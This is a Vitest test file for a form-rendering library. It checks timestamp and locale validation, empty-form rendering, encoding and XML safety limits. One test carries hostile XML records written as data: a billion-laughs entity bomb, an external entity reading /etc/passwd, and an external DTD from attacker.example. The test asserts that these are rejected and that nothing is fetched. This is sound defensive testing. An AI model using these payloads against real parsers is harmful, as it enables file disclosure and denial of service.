import { afterEach, beforeAll, expect, test, vi } from 'vitest';
import {
  buildFormIR,
  parseXsn,
  prepareView,
  renderView,
  type PreparedView,
  type RenderInput,
} from '../../src/index';
import { catchError } from '../helpers/catch-error';
import { encode } from '../helpers/encode';
import { readSample, sampleCabinets } from '../helpers/samples';
import { packageFileOf } from '../helpers/render-cases';
import { viewIR } from '../helpers/view-package';

// Spec 03 R1.2 (no record → the empty form), R1.4 (`now` and locale are checked inputs) and R1.5
// (the record is hostile input: spec 01's XML safety cases).

const NOW = '2026-11-03T09:00:00-08:00';
let form01: PreparedView;
let templateXml: Uint8Array;
beforeAll(async () => {
  const c = sampleCabinets().find((s) => s.slug === '01-leave-request')!;
  const t = await parseXsn(readSample(c.path));
  form01 = await prepareView(t, buildFormIR(t));
  templateXml = packageFileOf(t)('template.xml')!;
});

const network = { fetch: vi.fn() };
afterEach(() => {
  vi.unstubAllGlobals();
});

test('with no record, the empty form (initialXmlDocument) is rendered (R1.2)', () => {
  const none = renderView(form01, { now: NOW });
  const explicit = renderView(form01, { now: NOW, record: templateXml });
  // The record's file name differs ('template.xml' or 'record.xml'); nothing else may.
  expect(none.html).toBe(explicit.html);
  expect(none.issues).toEqual(explicit.issues);
  expect(none.html).toContain('Leave Request');
});

test('a template with no initialXmlDocument needs a record', async () => {
  const { t, ir } = viewIR([{ name: 'Good', file: 'dropdown-case.xsl' }]);
  const prepared = await prepareView(t, ir);
  expect(catchError(() => renderView(prepared, { now: NOW }))).toMatchObject({
    code: 'INVALID_RENDER_INPUT',
    details: { field: 'record' },
  });
  const out = renderView(prepared, {
    now: NOW,
    record: encode('<my:order xmlns:my="urn:my"/>', 'utf-8'),
  });
  expect(out.html).toContain('<select');
});

test.each([
  '2026-11-03T09:00:00-08:00',
  '2026-11-03T09:00:00Z',
  '2026-11-03T09:00Z',
  '2026-11-03T23:59:59.123456789+14:00',
])('now %s is accepted', (now) => {
  expect(renderView(form01, { now }).html).toContain('Leave Request');
});

test.each([
  ['a date only', '2026-11-03'],
  ['no offset', '2026-11-03T09:00:00'],
  ['month 13', '2026-13-03T09:00:00Z'],
  ['hour 24', '2026-11-03T24:00:00Z'],
  ['offset hour 24', '2026-11-03T09:00:00+24:00'],
  ['a space for T', '2026-11-03 09:00:00Z'],
  ['empty', ''],
])('now with %s is INVALID_RENDER_INPUT', (_name, now) => {
  expect(catchError(() => renderView(form01, { now }))).toMatchObject({
    code: 'INVALID_RENDER_INPUT',
    details: { field: 'now', value: now },
  });
});

test('now is required by the type, and checked at run time too', () => {
  // @ts-expect-error `now` is required (R1.4): there is no clock to fall back to.
  const input: RenderInput = {};
  expect(catchError(() => renderView(form01, input))).toMatchObject({
    code: 'INVALID_RENDER_INPUT',
    details: { field: 'now', value: 'undefined' },
  });
});

test.each(['en-US', 'en', 'vi-VN', 'zh-Hant-TW'])('locale %s is accepted', (locale) => {
  expect(() => renderView(form01, { now: NOW, locale })).not.toThrow();
});

test.each(['', 'english', 'en_US', 'e', '-US'])('locale %j is INVALID_RENDER_INPUT', (locale) => {
  expect(catchError(() => renderView(form01, { now: NOW, locale }))).toMatchObject({
    code: 'INVALID_RENDER_INPUT',
    details: { field: 'locale', value: locale },
  });
});

const record = (text: string) => encode(text, 'utf-8');

test.each([
  [
    'billion laughs',
    '<?xml version="1.0"?>\n<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]>\n<lolz>&lol2;</lolz>',
    'UNSAFE_XML',
  ],
  [
    'external entity',
    '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<r>&xxe;</r>',
    'UNSAFE_XML',
  ],
  ['external DTD', '<!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd">\n<r/>', 'UNSAFE_XML'],
  ['not well formed', '<my:leaveRequest xmlns:my="urn:x"><a></my:leaveRequest>', 'INVALID_XML'],
  ['an unknown entity', '<r>&nbsp;</r>', 'INVALID_XML'],
  ['deeper than xmlDepth', `${'<a>'.repeat(300)}${'</a>'.repeat(300)}`, 'LIMIT_EXCEEDED'],
])('a record with %s is %s, and nothing is fetched (R1.5)', (_name, text, code) => {
  network.fetch = vi.fn(() => {
    throw new Error('fetch called');
  });
  vi.stubGlobal('fetch', network.fetch);
  expect(catchError(() => renderView(form01, { now: NOW, record: record(text) }))).toMatchObject({
    code,
  });
  expect(network.fetch).not.toHaveBeenCalled();
});

test('the record limits are spec 01 limits, and can be overridden', () => {
  const deep = record(`<r>${'<a>'.repeat(20)}${'</a>'.repeat(20)}</r>`);
  expect(() => renderView(form01, { now: NOW, record: deep })).not.toThrow();
  expect(
    catchError(() => renderView(form01, { now: NOW, record: deep, limits: { xmlDepth: 10 } })),
  ).toMatchObject({ code: 'LIMIT_EXCEEDED', details: { limit: 'xmlDepth', max: 10 } });
  expect(
    catchError(() =>
      renderView(form01, { now: NOW, record: templateXml, limits: { xmlBytes: 100 } }),
    ),
  ).toMatchObject({ code: 'LIMIT_EXCEEDED', details: { limit: 'xmlBytes', max: 100 } });
});

test('a UTF-16 record renders like its UTF-8 form', () => {
  const text = new TextDecoder().decode(templateXml).replace(/^<\?xml[^?]*\?>/, '');
  const utf16 = encode(`<?xml version="1.0" encoding="UTF-16"?>${text}`, 'utf-16le', true);
  const utf8 = encode(`<?xml version="1.0" encoding="UTF-8"?>${text}`, 'utf-8');
  expect(renderView(form01, { now: NOW, record: utf16 }).html).toBe(
    renderView(form01, { now: NOW, record: utf8 }).html,
  );
});

test('a render is synchronous and returns frozen results', () => {
  const out = renderView(form01, { now: NOW });
  expect(out).not.toBeInstanceOf(Promise);
  expect(Object.isFrozen(out)).toBe(true);
  expect(Object.isFrozen(out.issues)).toBe(true);
});
